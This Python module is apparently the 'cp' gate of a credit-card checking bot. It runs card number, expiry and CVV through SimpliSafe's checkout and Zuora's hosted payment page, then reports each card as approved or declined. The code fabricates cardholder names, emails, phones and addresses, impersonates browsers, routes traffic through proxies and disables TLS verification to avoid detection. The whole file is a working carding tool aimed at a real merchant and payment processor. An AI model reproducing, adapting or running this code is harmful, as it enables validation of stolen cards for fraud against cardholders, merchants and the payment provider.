# Pure gate motor for 'cp' — no Telegram-bot dependency.

import random, base64, re

from faker import Faker

from urllib.parse import quote

from Crypto.PublicKey import RSA

from Crypto.Cipher import PKCS1_v1_5

import curl_cffi.requests as creq

from bs4 import BeautifulSoup

_GATEWAY = 'Zuora CCN'

_f = Faker('en_US')

_name = lambda: (_f.first_name().replace(' ', '').replace('.', ''), _f.last_name())

_email = lambda: f"{_f.user_name()}@{random.choice(['hotmail.com', 'gmail.com', 'yahoo.com'])}"

_phone = lambda: f'512678{random.randint(1111, 9999)}'

_street = lambda n: f'{n} street {random.randint(1111, 9999)}'

_ZUORA_PUB_KEY = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhh3jxYv3aGPWlq+fzds93PALKqL2BYTGDIVeande3dKvi101V/Vt3rZAQJ2RfkOjfNacient3B6DSKipX3OifbQpIexHG8rV3Yu04U30KYNwpOwcyTWVRNOD4EzfZGXqeg7fsHGzKc+8Pxz50dkK7monnRV23rtLeKsBKNFRL8RSyg5bEfc/571XJpCkSNPRHFj2k4dD7wRy3Sl98D7BkDJKrCtI1YO8RlU5kP8lFf9m2+tzvVxTV96rcbRI/6aH5tSI06VDg99niEz0B1Q9w4601WOqhlDnI1rIJlWv3rWbHROMUbLgoieZWi3OR8Q69yAFT61svnt+R6fpne2m5wIDAQAB'

_ZUORA_RSA_KEY = RSA.import_key(f'-----BEGIN PUBLIC KEY-----\n{_ZUORA_PUB_KEY}\n-----END PUBLIC KEY-----')

def _safe_json(r):
    try:
        return r.json()
    except Exception:
        snippet = re.sub('\\s+', ' ', r.text[:100])
        raise Exception(f'non-JSON ({r.status_code}): {snippet}')

def _rsa_encrypt(plaintext: str) -> str:
    ct = PKCS1_v1_5.new(_ZUORA_RSA_KEY).encrypt(plaintext.encode('utf-8'))
    b64 = base64.b64encode(ct).decode()
    return '\n'.join((b64[i:i + 64] for i in range(0, len(b64), 64)))

def _found(html, start, end):
    try:
        s = html.index(start) + len(start)
        return html[s:html.index(end, s)]
    except ValueError:
        return ''

def _flow(num, mes, ano, cvv, proxy=None):
    mes = mes.zfill(2)
    ano = '20' + ano if len(ano) == 2 else ano
    last = ''
    for _ in range(3):
        try:
            sess = creq.Session(impersonate=random.choice(['chrome110', 'chrome124', 'safari17_0']))
            sess.verify = False
            if proxy:
                p = proxy if '@' in proxy else proxy
                sess.proxies = {'http': f'http://{p}', 'https': f'http://{p}'}
            ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            fn, ln = _name()
            em, ph, st = (_email(), _phone(), _street(fn))
            r1 = sess.get('https://simplisafe.com/window-decals', timeout=20)
            atat_v2 = r1.cookies.get('atat_v2', '')
            vid_v2 = r1.cookies.get('vid', '')
            r2 = sess.get('https://api.ipify.org/?format=json', timeout=10)
            my_ip = _found(r2.text, '"ip":"', '"')
            hdrs = {'X-Simplisafe-Locale': 'en-US', 'X-Vid-Token': atat_v2, 'Content-Type': 'application/json', 'Origin': 'https://simplisafe.com', 'Referer': 'https://simplisafe.com/'}
            sess.post('https://api.prd.commerce.simplisafe.com/release/proxy/v1/facebook/api/v13/conversions/us', json={'data': [{'event_name': 'AddToCart', 'event_time': 1774382243, 'user_data': {'client_ip_address': my_ip, 'client_user_agent': ua, 'external_id': vid_v2}}]}, headers=hdrs, timeout=15)
            r4 = sess.post('https://api.prd.commerce.simplisafe.com/release/payment-decorator/v1/credit/methods', json={'clientType': 'ecomm-US', 'origin': 'https://simplisafe.com'}, headers=hdrs, timeout=20)
            rj4 = _safe_json(r4)
            id_ = rj4['id']
            tok = rj4['token']
            sig = rj4['signature']
            params = {'method': 'requestPage', 'host': 'https://simplisafe.com/payment-page', 'fromHostedPage': 'true', 'jsVersion': '1.3.1', 'signature': sig, 'token': tok, 'tenantId': '6000067', 'success': 'true', 'id': id_, 'field_currency': 'USD', 'countryWhiteList': 'USA', 'locale': 'en_US', 'style': 'inline', 'submitEnabled': 'false', 'customizeErrorRequired': 'true', 'zlog_level': 'warn'}
            r5 = sess.get('https://na.zuora.com/apps/PublicHostedPageLite.do', params=params, headers={'Referer': 'https://simplisafe.com/'}, timeout=20)
            soup = BeautifulSoup(r5.text, 'html.parser')
            tok_p = soup.find('input', {'id': 'token'}).get('value')
            sig = soup.find('input', {'id': 'signature'}).get('value')
            id_ = soup.find('input', {'id': 'id'}).get('value')
            xjd = soup.find('input', {'id': 'xjd28s_6sk'}).get('value')
            text_to_enc = f'##{num}#0000#{mes}#{ano}'
            datosenc = _rsa_encrypt(text_to_enc)
            phdrs = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://na.zuora.com', 'Referer': r5.url}
            pdata = {'method': 'submitPage', 'id': id_, 'tenantId': '6000067', 'token': tok_p, 'signature': sig, 'field_currency': 'USD', 'field_key': _ZUORA_PUB_KEY, 'locale': 'en_US', 'field_style': 'inline', 'jsVersion': '1.3.1', 'submitEnabled': 'false', 'customizeErrorRequired': 'true', 'fromHostedPage': 'true', 'isGScriptLoaded': 'false', 'host': 'https://simplisafe.com/payment-page', 'encrypted_fields': '#field_ipAddress#field_creditCardNumber#field_cardSecurityCode#field_creditCardExpirationMonth#field_creditCardExpirationYear', 'encrypted_values': datosenc, 'xjd28s_6sk': xjd, 'field_creditCardType': 'Visa', 'field_creditCardHolderName': f'{fn} {ln}', 'field_creditCardAddress1': st, 'field_creditCardCity': 'New York', 'field_creditCardState': 'New York', 'field_creditCardPostalCode': '10080-0001', 'field_creditCardCountry': 'USA', 'field_email': em, 'field_creditCardNumber': '', 'field_creditCardExpirationMonth': '', 'field_creditCardExpirationYear': '', 'field_cardSecurityCode': '', 'browserScreenHeight': '1080', 'browserScreenWidth': '1920'}
            r6 = sess.post('https://na.zuora.com/apps/PublicHostedPageLite.do', data=pdata, headers=phdrs, timeout=20)
            if '"success":"true"' in r6.text:
                return {'status': True, 'success': True, 'response': 'Approved ✅ | Zuora success'}
            try:
                rj6 = _safe_json(r6)
                msg = rj6.get('errorMessage') or rj6.get('error_message', '')
            except Exception:
                msg = r6.text[:80]
            return {'status': True, 'success': False, 'response': f'Declined ❌ | {str(msg)[:120]}'}
        except Exception as e:
            last = str(e)[:180]
    return {'status': False, 'raise': f'Retries exhausted: {last}'}

def _checker(cc, binData, proxy=None):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3], proxy=proxy)
    except ImportError as e:
        return {'status': False, 'raise': f'Missing dependency: {e}'}
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}

def run_check(cc, bin_data, ctx=None):
    r = _checker(cc, bin_data)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}